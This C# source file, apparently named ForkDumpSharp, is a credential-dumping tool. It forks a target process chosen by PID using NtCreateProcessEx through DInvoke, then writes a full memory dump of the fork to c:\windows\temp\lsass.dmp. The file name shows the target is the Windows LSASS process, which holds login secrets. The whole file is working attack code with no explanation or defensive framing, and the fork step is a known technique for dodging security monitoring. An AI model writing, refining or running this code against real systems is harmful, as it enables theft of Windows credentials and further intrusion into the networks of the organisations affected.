using System;
using System.Diagnostics;
using System.IO;
using static DInvoke.Data.Native;
using static ForkDumpSharp.Help;

namespace ForkDumpSharp
{
    class Program
    {
        static string dumpFile = @"c:\windows\temp\lsass.dmp";
        static void Main(string[] args)
        {
            IntPtr snapshotProcess = default;
            ForkSnapshot fss = new ForkSnapshot(Convert.ToInt32(args[0]));
            snapshotProcess = fss.TakeSnapshot();

            using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
            {
                Help.MiniDumpWriteDump(snapshotProcess,
                                Help.GetProcessIdOfThread(snapshotProcess),
                                fs.SafeFileHandle,
                                (uint)2,
                                IntPtr.Zero,
                                IntPtr.Zero,
                                IntPtr.Zero
                        );
            }

            fss.Dispose();

        }



    }
    class ForkSnapshot : IDisposable
    {
        public IntPtr TargetProcess = IntPtr.Zero;

        public IntPtr CurrentSnapshotProcess = IntPtr.Zero;

        public ForkSnapshot(Process process)
        {
            TargetProcess = process.Handle;
        }
        public ForkSnapshot(int pid)
        {
            //  PROCESS_CREATE_PROCESS
            TargetProcess = OpenProcess(0x0080, false, pid);
        }
        ~ForkSnapshot()
        {
            CleanSnapshot();
            GC.SuppressFinalize(this);
        }
        /// <summary>
        /// Take a snapshot of the target process
        /// A PROCESS_ALL_ACCESS HANDLE to a snapshot ot the target process
        /// </summary>
        /// <returns></returns>
        public IntPtr TakeSnapshot()
        {
            NTSTATUS status;
            NtCreateProcessEx ntCreateProcessEx = GetNtCreateProcessExAddress();
            status = ntCreateProcessEx(out CurrentSnapshotProcess,
                                        0xFFFF,
                                        IntPtr.Zero,
                                        TargetProcess,
                                        false,
                                        IntPtr.Zero,
                                        IntPtr.Zero,
                                        IntPtr.Zero
                                        );
            return CurrentSnapshotProcess;
        }

        public bool CleanSnapshot()
        {
            TerminateProcess(CurrentSnapshotProcess, 0);
            CloseHandle(CurrentSnapshotProcess);
            return true;
        }

        public void Dispose()
        {
            CleanSnapshot();
        }
    }
}
